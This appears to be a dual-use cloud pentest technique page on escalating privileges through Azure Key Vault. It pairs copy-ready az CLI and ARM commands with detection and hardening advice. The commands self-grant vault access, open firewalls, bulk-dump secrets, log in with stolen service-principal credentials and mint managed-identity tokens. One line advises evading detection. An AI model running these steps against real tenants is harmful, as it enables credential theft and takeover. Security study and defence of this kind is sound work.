---
cstg_id: CSTG-AZURE-KEY-VAULT-PRIVESC
title: "AZURE Key Vault - Privilege Escalation"
provider: azure
service: key-vault
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.KeyVault/vaults/accessPolicies/write"
  - "Microsoft.KeyVault/vaults/write"
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.KeyVault/vaults/secrets/getSecret/action"
  - "Microsoft.KeyVault/vaults/keys/sign/action"
  - "Microsoft.KeyVault/vaults/certificates/getSecret/action"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
tools:
  - azure-cli
  - az-rest
  - azure-powershell
  - microburst
  - bloodhound-azurehound
  - pacu-azure-modules
references:
  - "https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide"
  - "https://learn.microsoft.com/en-us/azure/key-vault/general/assign-access-policy"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles"
  - "https://learn.microsoft.com/en-us/azure/key-vault/general/security-features"
  - "https://www.netspi.com/blog/technical/cloud-penetration-testing/exploiting-azure-key-vault/"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Key Vault privilege escalation exploits the gap between the **management plane** (who can change vault authorization) and the **data plane** (who can read secret material). A principal that cannot read a vault's secrets today but *can* modify the vault's access policies or assign itself a data-plane RBAC role can grant itself read access and recover credentials - service-principal client secrets, database passwords, SAS tokens, and TLS private keys - that unlock the rest of the tenant. Equally, a principal that can read existing secrets is positioned for lateral movement and re-authentication as a more privileged identity.

This page enumerates each permission that enables an escalation path. Escalation falls into two families: **authorization self-grant** (using `accessPolicies/write` or `roleAssignments/write` to obtain data-plane access that was not previously held), and **credential recovery** (using existing data-plane read to extract material that re-authenticates as a higher-privileged principal). The attacker objective is to convert any vault-adjacent management permission into possession of high-value secret material, and from there into a more privileged identity.

## Prerequisites

- An authenticated foothold identity (assumed breach): a compromised user, service principal, or a workload's managed identity token.
- One or more of the escalation-enabling permissions listed in the frontmatter, held directly or inherited.
- For self-grant paths, a token for the ARM audience (`https://management.azure.com/`). For credential-recovery paths, a token for the vault audience (`https://vault.azure.net`).
- Network reachability to the target vault's data-plane endpoint (subject to its firewall / private-endpoint configuration).
- A completed inventory from [Key Vault enumeration](../02-services/azure-key-vault-enum.md), in particular the vault's `enableRbacAuthorization` value, which selects between the access-policy and RBAC paths below.

## Misconfigurations & Findings

- A principal holding `Microsoft.KeyVault/vaults/accessPolicies/write` (e.g., via **Key Vault Contributor** or **Contributor**) on a vault using the **legacy access-policy** model can add itself to the policy and read all secrets - a classic management-to-data-plane crossover.
- The built-in **Key Vault Contributor** role grants vault management including access-policy writes but, by design, *not* data-plane secret read - yet on access-policy vaults the management permission can be used to grant the missing data-plane access. This is the single most common Key Vault escalation.
- A principal with `Microsoft.Authorization/roleAssignments/write` at the vault (or higher) scope can assign itself **Key Vault Administrator** / **Key Vault Secrets User** and read everything.
- Vaults storing **service-principal client secrets or certificates** allow re-authentication as that service principal; if the SP is more privileged (e.g., holds `Application.ReadWrite.All` or `Directory.ReadWrite.All`), this is a direct path to tenant escalation.
- Vaults holding **certificate private keys** that back app registrations or AD CS templates enable impersonation.

## Exploitation

### Microsoft.KeyVault/vaults/accessPolicies/write

On a vault where `enableRbacAuthorization = false`, this permission lets the principal add itself (or a controlled principal) to the access policy with full secret/key/certificate permissions, then read everything.

```bash
# 1. Confirm the legacy access-policy model is in use
az keyvault show --name <vault> --query "properties.enableRbacAuthorization"   # expect: false

# 2. Grant the current identity Get+List on all object types
az keyvault set-policy --name <vault> \
  --object-id <my-object-id> \
  --secret-permissions get list \
  --key-permissions get list decrypt sign unwrapKey \
  --certificate-permissions get list

# 3. Read secret values
az keyvault secret list --vault-name <vault> -o tsv --query "[].id" \
  | while read id; do az keyvault secret show --id "$id" --query value -o tsv; done
```

Raw ARM equivalent (PATCH the access policy onto the vault resource):

```bash
az rest --method patch \
  --url "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>/accessPolicies/add?api-version=2023-07-01" \
  --body '{"properties":{"accessPolicies":[{"tenantId":"<tid>","objectId":"<my-object-id>","permissions":{"secrets":["get","list"],"keys":["get","list"],"certificates":["get","list"]}}]}}'
```

### Microsoft.Authorization/roleAssignments/write

When the vault uses Azure RBAC (or even when it does not, since RBAC always governs the management plane), a principal that can create role assignments at the vault scope can grant itself a data-plane role and then read secrets.

```bash
MY_ID=$(az ad signed-in-user show --query id -o tsv)   # or the SP/MI object id
SCOPE="/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>"

# Assign Key Vault Administrator (full data plane) to self
az role assignment create --assignee-object-id "$MY_ID" \
  --assignee-principal-type ServicePrincipal \
  --role "Key Vault Administrator" --scope "$SCOPE"

# Now read everything
az keyvault secret show --vault-name <vault> --name <secret>
```

This is also a general Azure escalation primitive: `roleAssignments/write` at any scope (e.g., **Owner**, **User Access Administrator**, or a custom role with that action) lets the principal grant itself any role over the vault. Prefer the least conspicuous role that grants read - **Key Vault Secrets User** - to reduce detection surface.

### Microsoft.KeyVault/vaults/write

Full management-plane control of the vault resource. Beyond access policies, this permits **toggling the authorization model** itself (`enableRbacAuthorization`) and **flipping network controls** so the data-plane endpoint becomes reachable.

```bash
# Open the firewall to read the vault from the current network position
az keyvault update --name <vault> --public-network-access Enabled --default-action Allow

# Or switch a previously RBAC-only vault to legacy access policies, then self-grant
az keyvault update --name <vault> --enable-rbac-authorization false
az keyvault set-policy --name <vault> --object-id <my-object-id> --secret-permissions get list
```

Switching the authorization model or relaxing the firewall converts a previously inaccessible vault into a readable one, after which the `accessPolicies/write` path above completes the escalation.

### Microsoft.KeyVault/vaults/secrets/getSecret/action

Direct data-plane secret read. On its own this is not escalation, but it becomes escalation when the recovered secret is itself a credential for a more privileged identity. The dominant case is a stored **service-principal client secret**.

```bash
# Recover a stored SP client secret
SECRET=$(az keyvault secret show --vault-name <vault> --name <sp-client-secret> --query value -o tsv)

# Re-authenticate as that (potentially more privileged) service principal
az login --service-principal -u <app-id> -p "$SECRET" --tenant <tenant-id>

# Confirm the new identity and its roles
az ad signed-in-user show 2>/dev/null; az role assignment list --all -o table
```

If the recovered SP holds Microsoft Graph application permissions such as `RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, or `Application.ReadWrite.All`, the path continues into Entra ID tenant escalation. Connection strings and storage SAS tokens recovered the same way enable lateral movement to data stores.

### Microsoft.KeyVault/vaults/certificates/getSecret/action

Retrieving a certificate via the *secret* endpoint returns the full **PFX including the private key**. If the certificate is the credential for an app registration, the private key permits federated/certificate-based sign-in as that application.

```bash
# Download the certificate WITH private key (returned as base64 PFX/PEM)
az keyvault secret show --vault-name <vault> --name <cert-name> --query value -o tsv > cert.b64
# Decode to PFX, then authenticate as the app that trusts this certificate
az login --service-principal -u <app-id> --tenant <tid> --password cert.pem
```

### Microsoft.KeyVault/vaults/keys/sign/action

Use of a stored key for signing without ever exporting it. Where a vault key backs a JWT-issuing service, a token-signing flow, or AD CS, sign access permits forging signed artifacts (e.g., authentication tokens) that are accepted as a higher-privileged identity, even though the raw key never leaves the vault.

```bash
# Sign attacker-controlled data with a vault-held key
az keyvault key sign --vault-name <vault> --name <key> --algorithm RS256 --digest <base64-digest>
```

### Microsoft.ManagedIdentity/userAssignedIdentities/assign/action

The ability to assign a user-assigned managed identity to a resource the attacker controls (e.g., a VM, Function, or Container Instance) lets the attacker attach an identity that *already* has vault data-plane access, then mint that identity's token from the controlled compute and read the vault. See [managed identity abuse](../03-privilege-escalation/azure-managed-identity-privesc.md) where present.

```bash
# Attach a vault-privileged user-assigned MI to a controlled VM, then pull its token
az vm identity assign --name <my-vm> --resource-group <rg> --identities <mi-resource-id>
# From inside the VM:
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

## Detection & Logging

- **Azure Activity Logs** are the primary signal for self-grant paths. Look for `Microsoft.KeyVault/vaults/accessPolicies/write` (`VaultPatch`), `Microsoft.KeyVault/vaults/write`, `Microsoft.Authorization/roleAssignments/write`, and changes to `enableRbacAuthorization` or `networkAcls` - especially when the caller is also the beneficiary of the new grant.
- **Key Vault AuditEvent resource logs** record data-plane reads: `SecretGet`, `KeyGet`, `CertificateGet`, and `KeySign`, with caller identity, application ID, and client IP. A burst of `SecretGet` immediately following an access-policy change is high-fidelity.
- **Entra ID sign-in logs** reveal re-authentication as a recovered service principal: a new sign-in for the SP from an unusual IP/ASN, or a first-ever interactive/SP token for the vault audience.
- **Entra ID audit logs** capture downstream directory escalations (role assignment, app credential additions) performed by the recovered identity.
- Managed detection: **Microsoft Defender for Key Vault** alerts on anomalous access volume, unusual principals, and access from suspicious networks; correlate with Defender for Cloud and Entra ID Protection risk events.

## Remediation & Hardening

- Separate management and data planes operationally: do not grant **Key Vault Contributor** to principals that should not read secrets, and on access-policy vaults treat `accessPolicies/write` as equivalent to full data-plane read.
- Standardize on the **Azure RBAC** model and avoid the legacy access-policy model, which decouples grants from RBAC audit.
- Tightly restrict `Microsoft.Authorization/roleAssignments/write` (Owner / User Access Administrator) and use **PIM** for just-in-time, time-boxed activation with approval.
- Do not store long-lived **service-principal client secrets** in vaults; prefer **workload identity federation** and managed identities so there is no secret to recover.
- Set `publicNetworkAccess = Disabled` and require private endpoints so a firewall flip is required (and logged) before any external read.
- Enable **purge protection** and the **AuditEvent** diagnostic setting, and alert on access-policy/role-assignment changes coupled with subsequent secret reads.
- Enable **Microsoft Defender for Key Vault** across all subscriptions.

## Tools

- **azure-cli** / **az-rest** - `az keyvault set-policy`, `az role assignment create`, `az keyvault update`, raw ARM PATCH.
- **azure-powershell** - `Set-AzKeyVaultAccessPolicy`, `New-AzRoleAssignment`, `Update-AzKeyVault`.
- **microburst** - automated vault discovery and dumping once access is obtained.
- **bloodhound / azurehound** - identify principals whose management permissions enable a vault self-grant path.
- **pacu (azure modules)** - escalation tooling for credential recovery and re-auth chains.

## References

- Key Vault RBAC guide - https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide
- Assign an access policy - https://learn.microsoft.com/en-us/azure/key-vault/general/assign-access-policy
- Azure built-in roles - https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles
- Key Vault security features - https://learn.microsoft.com/en-us/azure/key-vault/general/security-features
- Exploiting Azure Key Vault (NetSPI) - https://www.netspi.com/blog/technical/cloud-penetration-testing/exploiting-azure-key-vault/
- hackingthe.cloud (Azure) - https://hackingthe.cloud/azure/
